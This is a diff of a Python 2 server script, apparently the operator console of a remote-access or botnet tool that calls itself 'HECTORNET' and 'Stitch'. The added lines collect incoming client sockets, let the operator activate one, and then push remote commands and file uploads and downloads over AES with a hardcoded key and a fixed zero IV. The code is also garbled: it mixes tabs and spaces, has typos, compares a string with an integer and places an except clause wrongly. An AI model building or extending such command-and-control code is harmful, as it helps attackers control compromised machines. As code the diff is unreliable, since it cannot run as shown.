@@ -9,14 +9,12 @@ BLOCK_SIZE = 32
 EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
 DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))
 
-# generate a random secret key
 secret = "HUISA78sa9y&9syYSsJhsjkdjklfs9aR"
 
 inf_sock = {}
 inf_port = {}
 inf_name = {}
 
-# client information
 active = False
 clients = []
 socks = []
@@ -46,20 +44,27 @@ def run_server():
             if not server_running:
                 break
             try:
-                server.settimeout(2)
+                server.settimeout(10)
                 client_socket, addr = server.accept()
             except Exception as e:
                 pass
             if client_socket:
+		client_socket.settimeout(None)
+		socks += [client_scoket.settimeout]
+		clients += [str(addr)]
                 inf_sock[addr[0]] = client_socket
                 inf_port[addr[0]] = addr[1]
                 client_socket = None
+	    refresh()
+	    time.sleep(interval)
+
         server.close()
         for n in inf_sock: inf_sock[n].close()
         inf_sock={}
         inf_port={}
         listen_port=None
         server_thread=None
+	
 
 def stop_server():
         server_running = False
@@ -140,15 +145,81 @@ def refresh():
 
 
 def server_main():
-    try:
-        run_server()
-    except KeyboardInterrupt:
-        print"Exiting Stitch due to a KeyboardInterrupt"
-	sys.exit()
-    except Exception as e:
-        print("Exiting Stitch due to an exception:\n{}".format(str(e)))
-        print("[!] {}\n".format(str(e)))
-       	sys.exit()
+	try:
+	        run_server()
+	except KeyboardInterrupt:
+		refresh()
+		
+		activate = raw_input("\nEnter option(0/1-128): ")
+		
+		if activate == 0:
+			for j in range(0, len(socks)):
+				socks[j].close()
+		
+		activate -= 1
+		cipher = AES.new(secret,AES.MODE_CFB,'0000000000000000')
+		active = True
+		Send(socks[activate], 'Activate')
+	
+		while active:
+			try:
+				# receive data from client
+				data = Receive(socks[activate])
+			# disconnect client.
+			except:
+				print '\nClient disconnected... ' + clients[activate]
+				# delete client
+				socks[activate].close()
+				time.sleep(0.8)
+				socks.remove(socks[activate])
+				clients.remove(clients[activate])
+				refresh()
+				active = False
+				break
+
+			# exit client session
+			if data == 'quitted':
+				# print message
+				print "Exit.\n"
+				# remove from arrays
+				socks[activate].close()
+				socks.remove(socks[activate])
+				clients.remove(clients[activate])
+				# sleep and refresh
+				time.sleep(0.8)
+				refresh()
+				active = False
+				break
+			# if data exists
+			elif data != '':
+				# get next command
+				sys.stdout.write(data)
+				nextcmd = raw_input('~HECTORNET:>>> ')
+			
+			# download
+			if nextcmd.startswith("download ") == True:
+				if len(nextcmd.split(' ')) > 2:
+					download(socks[activate], nextcmd.split(' ')[1], nextcmd.split(' ')[2])
+				else:
+					download(socks[activate], nextcmd.split(' ')[1])
+			
+			# upload
+			elif nextcmd.startswith("upload ") == True:
+				if len(nextcmd.split(' ')) > 2:
+					upload(socks[activate], nextcmd.split(' ')[1], nextcmd.split(' ')[2])
+				else:
+					upload(socks[activate], nextcmd.split(' ')[1])
+			
+			# normal command
+			elif nextcmd != '':
+				Send(socks[activate], nextcmd)
+
+			elif nextcmd == '':
+				sys.exit()
+
+	        except Exception as e:
+	        	print("Exiting due to an exception:\n{}".format(str(e)))
+	        	print("[!] {}\n".format(str(e)))
 
 
 if __name__ == "__main__":
